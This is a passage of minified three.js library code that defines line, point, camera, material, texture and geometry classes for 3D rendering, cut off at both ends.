this.intersectsSphere(Xr)}intersectsSprite(e){Xr.center.set(0,0,0);const i=Mb.distanceTo(e.center);return Xr.radius=.7071067811865476+i,Xr.applyMatrix4(e.matrixWorld),this.intersectsSphere(Xr)}intersectsSphere(e){const i=this.planes,s=e.center,c=-e.radius;for(let f=0;f<6;f++)if(i[f].distanceToPoint(s)<c)return!1;return!0}intersectsBox(e){const i=this.planes;for(let s=0;s<6;s++){const c=i[s];if(fu.x=c.normal.x>0?e.max.x:e.min.x,fu.y=c.normal.y>0?e.max.y:e.min.y,fu.z=c.normal.z>0?e.max.z:e.min.z,c.distanceToPoint(fu)<0)return!1}return!0}containsPoint(e){const i=this.planes;for(let s=0;s<6;s++)if(i[s].distanceToPoint(e)<0)return!1;return!0}clone(){return new this.constructor().copy(this)}}class tS extends so{constructor(e){super(),this.isLineBasicMaterial=!0,this.type="LineBasicMaterial",this.color=new ze(16777215),this.map=null,this.linewidth=1,this.linecap="round",this.linejoin="round",this.fog=!0,this.setValues(e)}copy(e){return super.copy(e),this.color.copy(e.color),this.map=e.map,this.linewidth=e.linewidth,this.linecap=e.linecap,this.linejoin=e.linejoin,this.fog=e.fog,this}}const Lu=new it,Ou=new it,Xv=new cn,ul=new em,du=new El,kh=new it,kv=new it;class Eb extends kn{constructor(e=new $n,i=new tS){super(),this.isLine=!0,this.type="Line",this.geometry=e,this.material=i,this.morphTargetDictionary=void 0,this.morphTargetInfluences=void 0,this.updateMorphTargets()}copy(e,i){return super.copy(e,i),this.material=Array.isArray(e.material)?e.material.slice():e.material,this.geometry=e.geometry,this}computeLineDistances(){const e=this.geometry;if(e.index===null){const i=e.attributes.position,s=[0];for(let c=1,f=i.count;c<f;c++)Lu.fromBufferAttribute(i,c-1),Ou.fromBufferAttribute(i,c),s[c]=s[c-1],s[c]+=Lu.distanceTo(Ou);e.setAttribute("lineDistance",new Wn(s,1))}else se("Line.computeLineDistances(): Computation only possible with non-indexed BufferGeometry.");return this}intersectsFrustum(e){return e.intersectsObject(this)}raycast(e,i){const s=this.geometry,c=this.matrixWorld,f=e.params.Line.threshold,d=s.drawRange;if(s.boundingSphere===null&&s.computeBoundingSphere(),du.copy(s.boundingSphere),du.applyMatrix4(c),du.radius+=f,e.ray.intersectsSphere(du)===!1)return;Xv.copy(c).invert(),ul.copy(e.ray).applyMatrix4(Xv);const h=f/((this.scale.x+this.scale.y+this.scale.z)/3),m=h*h,p=this.isLineSegments?2:1,x=s.index,_=s.attributes.position;if(x!==null){const E=Math.max(0,d.start),T=Math.min(x.count,d.start+d.count);for(let w=E,y=T-1;w<y;w+=p){const S=x.getX(w),N=x.getX(w+1),B=hu(this,e,ul,m,S,N,w);B&&i.push(B)}if(this.isLineLoop){const w=x.getX(T-1),y=x.getX(E),S=hu(this,e,ul,m,w,y,T-1);S&&i.push(S)}}else{const E=Math.max(0,d.start),T=Math.min(_.count,d.start+d.count);for(let w=E,y=T-1;w<y;w+=p){const S=hu(this,e,ul,m,w,w+1,w);S&&i.push(S)}if(this.isLineLoop){const w=hu(this,e,ul,m,T-1,E,T-1);w&&i.push(w)}}}updateMorphTargets(){const i=this.geometry.morphAttributes,s=Object.keys(i);if(s.length>0){const c=i[s[0]];if(c!==void 0){this.morphTargetInfluences=[],this.morphTargetDictionary={};for(let f=0,d=c.length;f<d;f++){const h=c[f].name||String(f);this.morphTargetInfluences.push(0),this.morphTargetDictionary[h]=f}}}}}function hu(o,e,i,s,c,f,d){const h=o.geometry.attributes.position;if(Lu.fromBufferAttribute(h,c),Ou.fromBufferAttribute(h,f),i.distanceSqToSegment(Lu,Ou,kh,kv)>s)return;kh.applyMatrix4(o.matrixWorld);const p=e.ray.origin.distanceTo(kh);if(!(p<e.near||p>e.far))return{distance:p,point:kv.clone().applyMatrix4(o.matrixWorld),index:d,face:null,faceIndex:null,barycoord:null,object:o}}const Wv=new it,qv=new it;class bb extends Eb{constructor(e,i){super(e,i),this.isLineSegments=!0,this.type="LineSegments"}computeLineDistances(){const e=this.geometry;if(e.index===null){const i=e.attributes.position,s=[];for(let c=0,f=i.count;c<f;c+=2)Wv.fromBufferAttribute(i,c),qv.fromBufferAttribute(i,c+1),s[c]=c===0?0:s[c-1],s[c+1]=s[c]+Wv.distanceTo(qv);e.setAttribute("lineDistance",new Wn(s,1))}else se("LineSegments.computeLineDistances(): Computation only possible with non-indexed BufferGeometry.");return this}}class eS extends so{constructor(e){super(),this.isPointsMaterial=!0,this.type="PointsMaterial",this.color=new ze(16777215),this.map=null,this.alphaMap=null,this.size=1,this.sizeAttenuation=!0,this.fog=!0,this.setValues(e)}copy(e){return super.copy(e),this.color.copy(e.color),this.map=e.map,this.alphaMap=e.alphaMap,this.size=e.size,this.sizeAttenuation=e.sizeAttenuation,this.fog=e.fog,this}}const Yv=new cn,Hp=new em,pu=new El,mu=new it;class Tb extends kn{constructor(e=new $n,i=new eS){super(),this.isPoints=!0,this.type="Points",this.geometry=e,this.material=i,this.morphTargetDictionary=void 0,this.morphTargetInfluences=void 0,this.updateMorphTargets()}copy(e,i){return super.copy(e,i),this.material=Array.isArray(e.material)?e.material.slice():e.material,this.geometry=e.geometry,this}intersectsFrustum(e){return e.intersectsObject(this)}raycast(e,i){const s=this.geometry,c=this.matrixWorld,f=e.params.Points.threshold,d=s.drawRange;if(s.boundingSphere===null&&s.computeBoundingSphere(),pu.copy(s.boundingSphere),pu.applyMatrix4(c),pu.radius+=f,e.ray.intersectsSphere(pu)===!1)return;Yv.copy(c).invert(),Hp.copy(e.ray).applyMatrix4(Yv);const h=f/((this.scale.x+this.scale.y+this.scale.z)/3),m=h*h,p=s.index,v=s.attributes.position;if(p!==null){const _=Math.max(0,d.start),E=Math.min(p.count,d.start+d.count);for(let T=_,w=E;T<w;T++){const y=p.getX(T);mu.fromBufferAttribute(v,y),Zv(mu,y,m,c,e,i,this)}}else{const _=Math.max(0,d.start),E=Math.min(v.count,d.start+d.count);for(let T=_,w=E;T<w;T++)mu.fromBufferAttribute(v,T),Zv(mu,T,m,c,e,i,this)}}updateMorphTargets(){const i=this.geometry.morphAttributes,s=Object.keys(i);if(s.length>0){const c=i[s[0]];if(c!==void 0){this.morphTargetInfluences=[],this.morphTargetDictionary={};for(let f=0,d=c.length;f<d;f++){const h=c[f].name||String(f);this.morphTargetInfluences.push(0),this.morphTargetDictionary[h]=f}}}}}function Zv(o,e,i,s,c,f,d){const h=Hp.distanceSqToPoint(o);if(h<i){const m=new it;Hp.closestPointToPoint(o,m),m.applyMatrix4(s);const p=c.ray.origin.distanceTo(m);if(p<c.near||p>c.far)return;f.push({distance:p,distanceToRay:Math.sqrt(h),point:m,index:e,face:null,faceIndex:null,barycoord:null,object:d})}}class nS extends Xn{constructor(e=[],i=Kr,s,c,f,d,h,m,p,x){super(e,i,s,c,f,d,h,m,p,x),this.isCubeTexture=!0,this.flipY=!1}get images(){return this.image}set images(e){this.image=e}}class Sl extends Xn{constructor(e,i,s=sa,c,f,d,h=Un,m=Un,p,x=La,v=1){if(x!==La&&x!==Yr)throw new Error("THREE.DepthTexture: format must be either THREE.DepthFormat or THREE.DepthStencilFormat");const _={width:e,height:i,depth:v};super(_,c,f,d,h,m,x,s,p),this.isDepthTexture=!0,this.flipY=!1,this.generateMipmaps=!1,this.compareFunction=null}copy(e){return super.copy(e),this.source=new tm(Object.assign({},e.image)),this.compareFunction=e.compareFunction,this}toJSON(e){const i=super.toJSON(e);return i.compareFunction=this.compareFunction,i}}class Ab extends Sl{constructor(e,i=sa,s=Kr,c,f,d=Un,h=Un,m,p=La){const x={width:e,height:e,depth:1},v=[x,x,x,x,x,x];super(e,e,i,s,c,f,d,h,m,p),this.image=v,this.isCubeDepthTexture=!0,this.isCubeTexture=!0}get images(){return this.image}set images(e){this.image=e}}class iS extends Xn{constructor(e=null){super(),this.sourceTexture=e,this.isExternalTexture=!0}copy(e){return super.copy(e),this.sourceTexture=e.sourceTexture,this}}class bl extends $n{constructor(e=1,i=1,s=1,c=1,f=1,d=1){super(),this.type="BoxGeometry",this.parameters={width:e,height:i,depth:s,widthSegments:c,heightSegments:f,depthSegments:d};const h=this;c=Math.floor(c),f=Math.floor(f),d=Math.floor(d);const m=[],p=[],x=[],v=[];let _=0,E=0;T("z","y","x",-1,-1,s,i,e,d,f,0),T("z","y","x",1,-1,s,i,-e,d,f,1),T("x","z","y",1,1,e,s,i,c,d,2),T("x","z","y",1,-1,e,s,-i,c,d,3),T("x","y","z",1,-1,e,i,s,c,f,4),T("x","y","z",-1,-1,e,i,-s,c,f,5),this.setIndex(m),this.setAttribute("position",new Wn(p,3)),this.setAttribute("normal",new Wn(x,3)),this.setAttribute("uv",new Wn(v,2));function T(w,y,S,N,B,C,U,D,P,b,L){const F=C/P,V=U/b,$=C/2,ft=U/2,j=D/2,et=P+1,q=b+1;let W=0,ht=0;const lt=new it;for(let mt=0;mt<q;mt++){const gt=mt*V-ft;for(let Bt=0;Bt<et;Bt++){const Ut=Bt*F-$;lt[w]=Ut*N,lt[y]=gt*B,lt[S]=j,p.push(lt.x,lt.y,lt.z),lt[w]=0,lt[y]=0,lt[S]=D>0?1:-1,x.push(lt.x,lt.y,lt.z),v.push(Bt/P),v.push(1-mt/b),W+=1}}for(let mt=0;mt<b;mt++)for(let gt=0;gt<P;gt++){const Bt=_+gt+et*mt,Ut=_+gt+et*(mt+1),z=_+(gt+1)+et*(mt+1),pt=_+(gt+1)+et*mt;m.push(Bt,Ut,pt),m.push(Ut,z,pt),ht+=6}h.addGroup(E,ht,L),E+=ht,_+=W}}copy(e){return super.copy(e),this.parameters=Object.assign({},e.parameters),this}static fromJSON(e){return new bl(e.width,e.height,e.depth,e.widthSegments,e.heightSegments,e.depthSegments)}}class nm extends $n{constructor(e=[],i=[],s=1,c=0){super(),this.type="PolyhedronGeometry",this.parameters={vertices:e,indices:i,radius:s,detail:c};const f=[],d=[];h(c),p(s),x(),this.setAttribute("position",new Wn(f,3)),this.setAttribute("normal",new Wn(f.slice(),3)),this.setAttribute("uv",new Wn(d,2)),c===0?this.computeVertexNormals():this.normalizeNormals();function h(N){const B=new it,C=new it,U=new it;for(let D=0;D<i.length;D+=3)E(i[D+0],B),E(i[D+1],C),E(i[D+2],U),m(B,C,U,N)}function m(N,B,C,U){const D=U+1,P=[];for(let b=0;b<=D;b++){P[b]=[];const L=N.clone().lerp(C,b/D),F=B.clone().lerp(C,b/D),V=D-b;for(let $=0;$<=V;$++)$===0&&b===D?P[b][$]=L:P[b][$]=L.clone().lerp(F,$/V)}for(let b=0;b<D;b++)for(let L=0;L<2*(D-b)-1;L++){const F=Math.floor(L/2);L%2===0?(_(P[b][F+1]),_(P[b+1][F]),_(P[b][F])):(_(P[b][F+1]),_(P[b+1][F+1]),_(P[b+1][F]))}}function p(N){const B=new it;for(let C=0;C<f.length;C+=3)B.x=f[C+0],B.y=f[C+1],B.z=f[C+2],B.normalize().multiplyScalar(N),f[C+0]=B.x,f[C+1]=B.y,f[C+2]=B.z}function x(){const N=new it;for(let B=0;B<f.length;B+=3){N.x=f[B+0],N.y=f[B+1],N.z=f[B+2];const C=y(N)/2/Math.PI+.5,U=S(N)/Math.PI+.5;d.push(C,1-U)}T(),v()}function v(){for(let N=0;N<d.length;N+=6){const B=d[N+0],C=d[N+2],U=d[N+4],D=Math.max(B,C,U),P=Math.min(B,C,U);D>.9&&P<.1&&(B<.2&&(d[N+0]+=1),C<.2&&(d[N+2]+=1),U<.2&&(d[N+4]+=1))}}function _(N){f.push(N.x,N.y,N.z)}function E(N,B){const C=N*3;B.x=e[C+0],B.y=e[C+1],B.z=e[C+2]}function T(){const N=new it,B=new it,C=new it,U=new it,D=new Ue,P=new Ue,b=new Ue;for(let L=0,F=0;L<f.length;L+=9,F+=6){N.set(f[L+0],f[L+1],f[L+2]),B.set(f[L+3],f[L+4],f[L+5]),C.set(f[L+6],f[L+7],f[L+8]),D.set(d[F+0],d[F+1]),P.set(d[F+2],d[F+3]),b.set(d[F+4],d[F+5]),U.copy(N).add(B).add(C).divideScalar(3);const V=y(U);w(D,F+0,N,V),w(P,F+2,B,V),w(b,F+4,C,V)}}function w(N,B,C,U){U<0&&N.x===1&&(d[B]=N.x-1),C.x===0&&C.z===0&&(d[B]=U/2/Math.PI+.5)}function y(N){return Math.atan2(N.z,-N.x)}function S(N){return Math.atan2(-N.y,Math.sqrt(N.x*N.x+N.z*N.z))}}copy(e){return super.copy(e),this.parameters=Object.assign({},e.parameters),this}static fromJSON(e){return new nm(e.vertices,e.indices,e.radius,e.detail)}}class im extends nm{constructor(e=1,i=0){const s=(1+Math.sqrt(5))/2,c=[-1,s,0,1,s,0,-1,-s,0,1,-s,0,0,-1,s,0,1,s,0,-1,-s,0,1,-s,s,0,-1,s,0,1,-s,0,-1,-s,0,1],f=[0,11,5,0,5,1,0,1,7,0,7,10,0,10,11,1,5,9,5,11,4,11,10,2,10,7,6,7,1,8,3,9,4,3,4,2,3,2,6,3,6,8,3,8,9,4,9,5,2,4,11,6,2,10,8,6,7,9,8,1];super(c,f,e,i),this.type="IcosahedronGeometry",this.parameters={radius:e,detail:i}}static fromJSON(e){return new im(e.radius,e.detail)}}class zu extends $n{constructor(e=1,i=1,s=1,c=1){super(),this.type="PlaneGeometry",this.parameters={width:e,height:i,widthSegments:s,heightSegments:c};const f=e/2,d=i/2,h=Math.floor(s),m=Math.floor(c),p=h+1,x=m+1,v=e/h,_=i/m,E=[],T=[],w=[],y=[];for(let S=0;S<x;S++){const N=S*_-d;for(let B=0;B<p;B++){const C=B*v-f;T.push(C,-N,0),w.push(0,0,1),y.push(B/h),y.push(1-S/m)}}for(let S=0;S<m;S++)for(let N=0;N<h;N++){const B=N+p*S,C=N+p*(S+1),U=N+1+p*(S+1),D=N+1+p*S;E.push(B,C,D),E.push(C,U,D)}this.setIndex(E),this.setAttribute("position",new Wn(T,3)),this.setAttribute("normal",new Wn(w,3)),this.setAttribute("uv",new Wn(y,2))}copy(e){return super.copy(e),this.parameters=Object.assign({},e.parameters),this}static fromJSON(e){return new zu(e.width,e.height,e.widthSegments,e.heightSegments)}}class Rb extends $n{constructor(e=null){if(super(),this.type="WireframeGeometry",this.parameters={geometry:e},e!==null){const i=[],s=new Set,c=new it,f=new it;if(e.index!==null){const d=e.attributes.position,h=e.index;let m=e.groups;m.length===0&&(m=[{start:0,count:h.count,materialIndex:0}]);for(let p=0,x=m.length;p<x;++p){const v=m[p],_=v.start,E=v.count;for(let T=_,w=_+E;T<w;T+=3)for(let y=0;y<3;y++){const S=h.getX(T+y),N=h.getX(T+(y+1)%3);c.fromBufferAttribute(d,S),f.fromBufferAttribute(d,N),Kv(c,f,s)===!0&&(i.push(c.x,c.y,c.z),i.push(f.x,f.y,f.z))}}}else{const d=e.attributes.position;for(let h=0,m=d.count/3;h<m;h++)for(let p=0;p<3;p++){const x=3*h+p,v=3*h+(p+1)%3;c.fromBufferAttribute(d,x),f.fromBufferAttribute(d,v),Kv(c,f,s)===!0&&(i.push(c.x,c.y,c.z),i.push(f.x,f.y,f.z))}}this.setAttribute("position",new Wn(i,3))}}copy(e){return super.copy(e),this.parameters=Object.assign({},e.parameters),this}}function Kv(o,e,i){const s=`${o.x},${o.y},${o.z}-${e.x},${e.y},${e.z}`,c=`${e.x},${e.y},${e.z}-${o.x},${o.y},${o.z}`;return i.has(s)===!0||i.has(c)===!0?!1:(i.add(s),i.add(c),!0)}function ao(o){const e={};for(const i in o){e[i]={};for(const s in o[i]){const c=o[i][s];if(jv(c))c.isRenderTargetTexture?(se("UniformsUtils: Textures of render targets cannot be cloned via cloneUniforms() or mergeUniforms()."),e[i][s]=null):e[i][s]=c.clone();else if(Array.isArray(c))if(jv(c[0])){const f=[];for(let d=0,h=c.length;d<h;d++)f[d]=c[d].clone();e[i][s]=f}else e[i][s]=c.slice();else e[i][s]=c}}return e}function Vn(o){const e={};for(let i=0;i<o.length;i++){const s=ao(o[i]);for(const c in s)e[c]=s[c]}return e}function jv(o){return o&&(o.isColor||o.isMatrix3||o.isMatrix4||o.isVector2||o.isVector3||o.isVector4||o.isTexture||o.isQuaternion)}function Cb(o){const e=[];for(let i=0;i<o.length;i++)e.push(o[i].clone());return e}function aS(o){const e=o.getRenderTarget();return e===null?o.outputColorSpace:e.isXRRenderTarget===!0?e.texture.colorSpace:we.workingColorSpace}const wb={clone:ao,merge:Vn};var Nb=`void main() {
	gl_Position = projectionMatrix * modelViewMatrix * vec4( position, 1.0 );
}`,Db=`void main() {
	gl_FragColor = vec4( 1.0, 0.0, 0.0, 1.0 );
}`;class la extends so{constructor(e){super(),this.isShaderMaterial=!0,this.type="ShaderMaterial",this.defines={},this.uniforms={},this.uniformsGroups=[],this.vertexShader=Nb,this.fragmentShader=Db,this.linewidth=1,this.wireframe=!1,this.wireframeLinewidth=1,this.fog=!1,this.lights=!1,this.clipping=!1,this.forceSinglePass=!0,this.extensions={clipCullDistance:!1,multiDraw:!1},this.defaultAttributeValues={color:[1,1,1],uv:[0,0],uv1:[0,0]},this.index0AttributeName=void 0,this.uniformsNeedUpdate=!1,this.glslVersion=null,e!==void 0&&this.setValues(e)}copy(e){return super.copy(e),this.fragmentShader=e.fragmentShader,this.vertexShader=e.vertexShader,this.uniforms=ao(e.uniforms),this.uniformsGroups=Cb(e.uniformsGroups),this.defines=Object.assign({},e.defines),this.wireframe=e.wireframe,this.wireframeLinewidth=e.wireframeLinewidth,this.fog=e.fog,this.lights=e.lights,this.clipping=e.clipping,this.extensions=Object.assign({},e.extensions),this.glslVersion=e.glslVersion,this.defaultAttributeValues=Object.assign({},e.defaultAttributeValues),this.index0AttributeName=e.index0AttributeName,this.uniformsNeedUpdate=e.uniformsNeedUpdate,this}toJSON(e){const i=super.toJSON(e);i.glslVersion=this.glslVersion,i.uniforms={};for(const c in this.uniforms){const d=this.uniforms[c].value;d&&d.isTexture?i.uniforms[c]={type:"t",value:d.toJSON(e).uuid}:d&&d.isColor?i.uniforms[c]={type:"c",value:d.getHex()}:d&&d.isVector2?i.uniforms[c]={type:"v2",value:d.toArray()}:d&&d.isVector3?i.uniforms[c]={type:"v3",value:d.toArray()}:d&&d.isVector4?i.uniforms[c]={type:"v4",value:d.toArray()}:d&&d.isMatrix3?i.uniforms[c]={type:"m3",value:d.toArray()}:d&&d.isMatrix4?i.uniforms[c]={type:"m4",value:d.toArray()}:i.uniforms[c]={value:d}}Object.keys(this.defines).length>0&&(i.defines=this.defines),i.vertexShader=this.vertexShader,i.fragmentShader=this.fragmentShader,i.lights=this.lights,i.clipping=this.clipping;const s={};for(const c in this.extensions)this.extensions[c]===!0&&(s[c]=!0);return Object.keys(s).length>0&&(i.extensions=s),i}fromJSON(e,i){if(super.fromJSON(e,i),e.uniforms!==void 0)for(const s in e.uniforms){const c=e.uniforms[s];switch(this.uniforms[s]={},c.type){case"t":this.uniforms[s].value=i[c.value]||null;break;case"c":this.uniforms[s].value=new ze().setHex(c.value);break;case"v2":this.uniforms[s].value=new Ue().fromArray(c.value);break;case"v3":this.uniforms[s].value=new it().fromArray(c.value);break;case"v4":this.uniforms[s].value=new ln().fromArray(c.value);break;case"m3":this.uniforms[s].value=new de().fromArray(c.value);break;case"m4":this.uniforms[s].value=new cn().fromArray(c.value);break;default:this.uniforms[s].value=c.value}}if(e.defines!==void 0&&(this.defines=e.defines),e.vertexShader!==void 0&&(this.vertexShader=e.vertexShader),e.fragmentShader!==void 0&&(this.fragmentShader=e.fragmentShader),e.glslVersion!==void 0&&(this.glslVersion=e.glslVersion),e.extensions!==void 0)for(const s in e.extensions)this.extensions[s]=e.extensions[s];return e.lights!==void 0&&(this.lights=e.lights),e.clipping!==void 0&&(this.clipping=e.clipping),this}}class Ub extends la{constructor(e){super(e),this.isRawShaderMaterial=!0,this.type="RawShaderMaterial"}}class Lb extends so{constructor(e){super(),this.isMeshDepthMaterial=!0,this.type="MeshDepthMaterial",this.depthPacking=FE,this.map=null,this.alphaMap=null,this.displacementMap=null,this.displacementScale=1,this.displacementBias=0,this.wireframe=!1,this.wireframeLinewidth=1,this.setValues(e)}copy(e){return super.copy(e),this.depthPacking=e.depthPacking,this.map=e.map,this.alphaMap=e.alphaMap,this.displacementMap=e.displacementMap,this.displacementScale=e.displacementScale,this.displacementBias=e.displacementBias,this.wireframe=e.wireframe,this.wireframeLinewidth=e.wireframeLinewidth,this}}class Ob extends so{constructor(e){super(),this.isMeshDistanceMaterial=!0,this.type="MeshDistanceMaterial",this.map=null,this.alphaMap=null,this.displacementMap=null,this.displacementScale=1,this.displacementBias=0,this.setValues(e)}copy(e){return super.copy(e),this.map=e.map,this.alphaMap=e.alphaMap,this.displacementMap=e.displacementMap,this.displacementScale=e.displacementScale,this.displacementBias=e.displacementBias,this}}const gu=new it,_u=new ro,ta=new it;class rS extends kn{constructor(){super(),this.isCamera=!0,this.type="Camera",this.matrixWorldInverse=new cn,this.projectionMatrix=new cn,this.projectionMatrixInverse=new cn,this.coordinateSystem=aa,this._reversedDepth=!1}get reversedDepth(){return this._reversedDepth}copy(e,i){return super.copy(e,i),this.matrixWorldInverse.copy(e.matrixWorldInverse),this.projectionMatrix.copy(e.projectionMatrix),this.projectionMatrixInverse.copy(e.projectionMatrixInverse),this.coordinateSystem=e.coordinateSystem,this}getWorldDirection(e){return super.getWorldDirection(e).negate()}updateMatrixWorld(e){super.updateMatrixWorld(e),this.matrixWorld.decompose(gu,_u,ta),ta.x===1&&ta.y===1&&ta.z===1?this.matrixWorldInverse.copy(this.matrixWorld).invert():this.matrixWorldInverse.compose(gu,_u,ta.set(1,1,1)).invert()}updateWorldMatrix(e,i,s=!1){super.updateWorldMatrix(e,i,s),this.matrixWorld.decompose(gu,_u,ta),ta.x===1&&ta.y===1&&ta.z===1?this.matrixWorldInverse.copy(this.matrixWorld).invert():this.matrixWorldInverse.compose(gu,_u,ta.set(1,1,1)).invert()}clone(){return new this.constructor().copy(this)}}const pr=new it,Qv=new Ue,Jv=new Ue;class Ti extends rS{constructor(e=50,i=1,s=.1,c=2e3){super(),this.isPerspectiveCamera=!0,this.type="PerspectiveCamera",this.fov=e,this.zoom=1,this.near=s,this.far=c,this.focus=10,this.aspect=i,this.view=null,this.filmGauge=35,this.filmOffset=0,this.updateProjectionMatrix()}copy(e,i){return super.copy(e,i),this.fov=e.fov,this.zoom=e.zoom,this.near=e.near,this.far=e.far,this.focus=e.focus,this.aspect=e.aspect,this.view=e.view===null?null:Object.assign({},e.view),this.filmGauge=e.filmGauge,this.filmOffset=e.filmOffset,this}setFocalLength(e){const i=.5*this.getFilmHeight()/e;this.fov=Fp*2*Math.atan(i),this.updateProjectionMatrix()}getFocalLength(){const e=Math.tan(Mh*.5*this.fov);return .5*this.getFilmHeight()/e}getEffectiveFOV(){return Fp*2*Math.atan(Math.tan(Mh*.5*this.fov)/this.zoom)}getFilmWidth(){return this.filmGauge*Math.min(this.aspect,1)}getFilmHeight(){return this.filmGauge/Math.max(this.aspect,1)}getViewBounds(e,i,s){pr.set(-1,-1,.5).applyMatrix4(this.projectionMatrixInverse),i.set(pr.x,pr.y).multiplyScalar(-e/pr.z),pr.set(1,1,.5).applyMatrix4(this.projectionMatrixInverse),s.set(pr.x,pr.y).multiplyScalar(-e/pr.z)}getViewSize(e,i){return this.getViewBounds(e,Qv,Jv),i.subVectors(Jv,Qv)}setViewOffset(e,i,s,c,f,d){this.aspect=e/i,this.view===null&&(this.view={enabled:!0,fullWidth:1,fullHeight:1,offsetX:0,offsetY:0,width:1,height:1}),this.view.enabled=!0,this.view.fullWidth=e,this.view.fullHeight=i,this.view.offsetX=s,this.view.offsetY=c,this.view.width=f,this.view.height=d,this.updateProjectionMatrix()}clearViewOffset(){this.view!==null&&(this.view.enabled=!1),this.updateProjectionMatrix()}updateProjectionMatrix(){const e=this.near;let i=e*Math.tan(Mh*.5*this.fov)/this.zoom,s=2*i,c=this.aspect*s,f=-.5*c;const d=this.view;if(this.view!==null&&this.view.enabled){const m=d.fullWidth,p=d.fullHeight;f+=d.offsetX*c/m,i-=d.offsetY*s/p,c*=d.width/m,s*=d.height/p}const h=this.filmOffset;h!==0&&(f+=e*h/this.getFilmWidth()),this.projectionMatrix.makePerspective(f,f+c,i,i-s,e,this.far,this.coordinateSystem,this.reversedDepth),this.projectionMatrixInverse.copy(this.projectionMatrix).invert()}toJSON(e){const i=super.toJSON(e);return i.object.fov=this.fov,i.object.zoom=this.zoom,i.object.near=this.near,i.object.far=this.far,i.object.focus=this.focus,i.object.aspect=this.aspect,this.view!==null&&(i.object.view=Object.assign({},this.view)),i.object.filmGauge=this.filmGauge,i.object.filmOffset=this.filmOffset,i}}class sS extends rS{constructor(e=-1,i=1,s=1,c=-1,f=.1,d=2e3){super(),this.isOrthographicCamera=!0,this.type="OrthographicCamera",this.zoom=1,this.view=null,this.left=e,this.right=i,this.top=s,this.bottom=c,this.near=f,this.far=d,this.updateProjectionMatrix()}copy(e,i){return super.copy(e,i),this.left=e.left,this.right=e.right,this.top=e.top,this.bottom=e.bottom,this.near=e.near,this.far=e.far,this.zoom=e.zoom,this.view=e.view===null?null:Object.assign({},e.view),this}setViewOffset(e,i,s,c,f,d){this.view===null&&(this.view={enabled:!0,fullWidth:1,fullHeight:1,offsetX:0,offsetY:0,width:1,height:1}),this.view.enabled=!0,this.view.fullWidth=e,this.view.fullHeight=i,this.view.offsetX=s,this.view.offsetY=c,this.view.width=f,this.view.height=d,this.updateProjectionMatrix()}clearViewOffset(){this.view!==null&&(this.view.enabled=!1),this.updateProjectionMatrix()}updateProjectionMatrix(){const e=(this.right-this.left)/(2*this.zoom),i=(this.top-this.bottom)/(2*this.zoom),s=(this.right+this.left)/2,c=(this.top+this.bottom)/2;let f=s-e,d=s+e,h=c+i,m=c-i;if(this.view!==null&&this.view.enabled){const p=(this.right-this.left)/this.view.fullWidth/this.zoom,x=(this.top-this.bottom)/this.view.fullHeight/this.zoom;f+=p*this.view.offsetX,d=f+p*this.view.width,h-=x*this.view.offsetY,m=h-x*this.view.height}this.projectionMatrix.makeOrthographic(f,d,h,m,this.near,this.far,this.coordinateSystem,this.reversedDepth),this.projectionMatrixInverse.copy(this.projectionMatrix).invert()}toJSON(e){const i=super.toJSON(e);return i.object.zoom=this.zoom,i.object.left=this.left,i.object.right=this.right,i.object.top=this.top,i.object.bottom=this.bottom,i.object.near=this.near,i.object.far=this.far,this.view!==null&&(i.object.view=Object.assign({},this.view)),i}}const js=-90,Qs=1;class Pb extends kn{constructor(e,i,s){super(),this.type="CubeCamera",this.renderTarget=s,this.coordinateSystem=null,this.activeMipmapLevel=0;const c=new Ti(js,Qs,e,i);c.layers=this.layers,this.add(c);const f=new Ti(js,Qs,e,i);f.layers=this.layers,this.add(f);const d=new Ti(js,Qs,e,i);d.layers=this.layers,this.add(d);const h=new Ti(js,Qs,e,i);h.layers=this.layers,this.add(h);const m=new Ti(js,Qs,e,i);m.layers=this.layers,this.add(m);const p=new Ti(js,Qs,e,i);p.layers=this.layers,this.add(p)}updateCoordinateSystem(){const e=this.coordinateSystem,i=this.children.concat(),[s,c,f,d,h,m]=i;for(const p of i)this.remove(p);if(e===aa)s.up.set(0,1,0),s.lookAt(1,0,0),c.up.set(0,1,0),c.lookAt(-1,0,0),f.up.set(0,0,-1),f.lookAt(0,1,0),d.up.set(0,0,1),d.lookAt(0,-1,0),h.up.set(0,1,0),h.lookAt(0,0,1),m.up.set(0,1,0),m.lookAt(0,0,-1);else if(e===Du)s.up.set(0,-1,0),s.lookAt(-1,0,0),c.up.set(0,-1,0),c.lookAt(1,0,0),f.up.set(0,0,1),f.lookAt(0,1,0),d.up.set(0,0,-1),d.lookAt(0,-1,0),h.up.set(0,-1,0),h.lookAt(0,0,1),m.up.set(0,-1,0),m.lookAt(0,0,-1);else throw new Error("THREE.CubeCamera.updateCoordinateSystem(): Invalid coordinate system: "+e);for(const p of i)this.add(p),p.updateMatrixWorld()}update(e,i){this.parent===null&&this.updateMatrixWorld();const{renderTarget:s,activeMipmapLevel:c}=this;this.coordinateSystem!==e.coordinateSystem&&(this.coordinateSystem=e.coordinateSystem,this.updateCoordinateSystem());const[f,d,h,m,p,x]=this.children,v=e.getRenderTarget(),_=e.getActiveCubeFace(),E=e.getActiveMipmapLevel(),T=e.xr.enabled;e.xr.enabled=!1;const w=s.texture.generateMipmaps;s.texture.generateMipmaps=!1;let y=!1;e.isWebGLRenderer===!0?y=e.state.buffers.depth.getReversed():y=e.reversedDepthBuffer,e.setRenderTarget(s,0,c),y&&e.autoClear===!1&&e.clearDepth(),e.render(i,f),e.setRenderTarget(s,1,c),y&&e.autoClear===!1&&e.clearDepth(),e.render(i,d),e.setRenderTarget(s,2,c),y&&e.autoClear===!1&&e.clearDepth(),e.render(i,h),e.setRenderTarget(s,3,c),y&&e.autoClear===!1&&e.clearDepth(),e.render(i,m),e.setRenderTarget(s,4,c),y&&e.autoClear===!1&&e.clearDepth(),e.render(i,p),s.texture.generateMipmaps=w,e.setRenderTarget(s,5,c),y&&e.autoClear===!1&&e.clearDepth(),e.render(i,x),e.setRenderTarget(v,_,E),e.xr.enabled=T,s.texture.needsPMREMUpdate=!0}}class Ib extends Ti{constructor(e=[]){super(),this.isArrayCamera=!0,this.isMultiViewCamera=!1,this.cameras=e}}const lm=class lm{constructor(e,i,s,c){this.elements=[1,0,0,1],e!==void 0&&this.set(e,i,s,c)}identity(){return this.set(1,0,0,1),this}fromArray(e,i=0){for(let s=0;s<4;s++)this.elements[s]=e[s+i];return this}set(e,i,s,c){const f=this.elements;return f[0]=e,f[2]=i,f[1]=s,f[3]=c,this}};lm.prototype.isMatrix2=!0;let $v=lm;function tx(o,e,i,s){const c=zb(s);switch(i){case Xx:return o*e;case Wx:return 